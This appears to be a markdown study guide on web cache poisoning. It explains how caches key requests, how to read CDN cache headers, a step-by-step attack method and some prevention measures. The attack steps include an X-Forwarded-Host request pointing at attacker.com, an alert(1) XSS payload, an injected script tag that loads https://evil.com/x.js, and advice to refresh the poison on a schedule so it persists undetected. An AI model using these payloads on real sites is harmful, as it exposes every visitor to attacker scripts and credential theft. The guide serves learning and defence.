# üõ° Web Cache Poisoning

## üìë Table of Contents
1. [What is Web Cache Poisoning?](#1Ô∏è‚É£-what-is-web-cache-poisoning)
2. [How Does a Web Cache Work?](#2Ô∏è‚É£-how-does-a-web-cache-work)
3. [Impact of a Web Cache Poisoning Attack](#3Ô∏è‚É£-impact-of-a-web-cache-poisoning-attack)
4. [Constructing a Web Cache Poisoning Attack](#4Ô∏è‚É£-constructing-a-web-cache-poisoning-attack)
5. [Exploiting Web Cache Poisoning Vulnerabilities](#5Ô∏è‚É£-exploiting-web-cache-poisoning-vulnerabilities)
6. [Prevention Techniques](#6Ô∏è‚É£-how-to-prevent-web-cache-poisoning-vulnerabilities)

---

## 1Ô∏è‚É£ What is Web Cache Poisoning?
Cache: Small, ***temporary storage*** that keeps frequently accessed data for quick access.

*Web-cache*  : Stores parts of a website (pages, images, scripts) so they can be served faster without always going back to the main server.

**Web cache poisoning** is an attack where an attacker manipulates a web server‚Äôs cache to store a **malicious HTTP response**.  
When other users request the same resource, they receive the **poisoned (malicious) response** instead of the intended one.

The attacker‚Äôs goal: **Serve malicious content to many users** via the cache without directly targeting each one.

---

## 2Ô∏è‚É£ How Does a Web Cache Work?
A **web cache** stores HTTP responses so that future requests for the same resource can be served quickly without re-fetching from the origin server.  
Types of caches:
- **Browser Cache** ‚Äì Stored on the client side.
- **CDN / Reverse Proxy Cache** ‚Äì Stored at network level (e.g., Cloudflare, Akamai).
- **Server Cache** ‚Äì Stored on the web server.

**Basic process:**
1. Client sends HTTP request.
2. Cache checks if a valid cached copy exists.
3. If yes ‚Üí serve cached response.  
   If no ‚Üí forward request to server ‚Üí store server‚Äôs response in cache ‚Üí serve to client.

1Ô∏è‚É£ Keyed Cache ::  A keyed cache is when the cache takes certain request parameters (query strings, headers, cookies, etc.) into account when deciding if a response is the same as a previously cached one.

``` Example 
GET /1.5 HTTP/2
Host: mozilla.com
```

2Ô∏è‚É£ Unkeyed Cache :: An unkeyed cache is when the cache ignores certain request parameters, so multiple different requests can map to the same cached object.

``` Example 
User-Agent: Firefox/128.-desktop
Accept: application/json;q=0.9,*/*;q=0.2
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Authorization: Hawk 
```
---
‚úÖ Check HTTP Response Headers

**curl -w "%{time_total}\n" -o /dev/null -s https://example.com ***

***curl -I https://example.com***

- Most CDNs add cache status headers that indicate whether the content was served from cache or fetched from the origin server.

Common ones:

| CDN / Proxy  | Header Example                   | Meaning |
|--------------|----------------------------------|---------|
| **Cloudflare** | `CF-Cache-Status: HIT`           | Served from CDN cache |
| **CloudFront** | `X-Cache: Hit from cloudfront`   | Served from CDN cache |
| **Fastly**     | `X-Cache: HIT`                   | Served from cache |
| **Akamai**     | `X-Cache: TCP_HIT`               | Served from cache |
| **Varnish**    | `Age: 123`                       | Seconds since cached copy was fetched |
| **General**    | `Age` header                     | >0 means cached; 0 or missing likely means fresh from server |

```
CF-Cache-Status: HIT
Age: 253
```

- This means the response was from a CDN‚Äôs cache and was cached 253 seconds ago.
- Look at Response Headers for CDN-specific headers (CF-, X-Cache, Age, etc.).
---

## 3Ô∏è‚É£ Impact of a Web Cache Poisoning Attack
- **Widespread XSS** ‚Äì Inject JavaScript into cached responses.
- **Defacement** ‚Äì Alter content displayed to all users.
- **Phishing** ‚Äì Redirect cached pages to malicious sites.
- **Credential Theft** ‚Äì Inject scripts to steal cookies/session tokens.
- **Service Disruption** ‚Äì Deliver broken or malicious responses to legitimate users.

---

## 4Ô∏è‚É£ Constructing a Web Cache Poisoning Attack

### Step 1: Identify and Evaluate Unkeyed Inputs
- **Unkeyed inputs** are parts of the HTTP request that affect the response **but are not part of the cache key**.
- Example: HTTP headers like `X-Forwarded-Host` or query parameters ignored by the cache.
- **Why it matters:** If the cache ignores an input but the server processes it, you can control the cached output.


### Step 2: Param Miner
- Use **Burp Suite‚Äôs Param Miner extension** to automatically guess:
  - Hidden parameters
  - Non-standard HTTP headers
  - Inputs that may influence server behavior but not the cache key.
- This helps find cache poisoning vectors.

### Step 3: Elicit a Harmful Response from the Back-End Server
- Manipulate the unkeyed input to:
  - Trigger **JavaScript injection** (for XSS)
  - Add **malicious redirects**
  - Alter HTML responses
- Example:
  ```http
  GET / HTTP/1.1
  Host: victim.com
  X-Forwarded-Host: attacker.com
  ```
- Possible payloads:
	- Inject HTML/JS (<script>alert(1)</script>)
	- Change redirect URLs
	- Alter API responses

### Step 4: Get the Response Cached
- Ensure the poisoned response is cacheable:
	- Cache-Control should allow caching (no no-store or private).
	- Sometimes removing cookies (Set-Cookie) makes it cacheable.
- Verify:
	- Send multiple requests ‚Üí see if same response is served without origin server hit.
- Tip: Use Burp‚Äôs Repeater to replay and check if response changes between requests.


### Step 5: Deliver the Poisoned Cache to Victims
- Once the malicious response is cached:
	- Anyone requesting the same URL will get the poisoned content.
	- Works on CDN edges globally if CDN caching is enabled.
- Example:
	- Inject <script src="https://evil.com/x.js"></script> into homepage.
	- Cached at CDN ‚Üí All visitors worldwide load attacker‚Äôs script.

### Step 6: Monitor Cache Behavior
Determine:
- Cache expiry time (`max-age`, `Expires` header).
- Whether partial requests (query params) map to the same cache entry.
- If multiple caches are in the chain (browser ‚Üí CDN ‚Üí reverse proxy).

**Goal:** Maximize reach by understanding cache hierarchy.

### Step 7: Maintain or Refresh the Poison
Some caches may expire quickly.

To persist the attack:
- Periodically resend the poisoning request before expiry.
- Automate refresh with a script or scheduler.

**Note:** This can keep the attack live indefinitely until detected.

## 5Ô∏è‚É£ Exploiting Web Cache Poisoning Vulnerabilities
Once cached, the poisoned content:
- Affects all users who request that cached resource.
- Can persist until cache expiry or manual purge.

**Example scenario:**
1. Attacker injects: into homepage
   ```html
   <script src="https://evil.com/x.js"></script>
   ```
2. Cache stores this malicious page.
3. All visitors load attacker‚Äôs script.

### 6Ô∏è‚É£ How to Prevent Web Cache Poisoning Vulnerabilities

1. Normalize Requests
	- Ensure cache and server process requests identically.
	- Include all user-controllable inputs in cache key.
	- Avoid unkeyed input issues.

2. Sanitize User Input
	- Never reflect unsanitized data in cached responses.

3. Set Strict Caching Rules
	- Use Cache-Control: no-store for dynamic/user-specific content.

4. Whitelist Headers and Parameters
	- Reject or ignore unexpected ones.

5. Security Testing
	- Test with tools like Burp Suite and Param Miner.
	- simulate poisoning scenarios in staging environments.
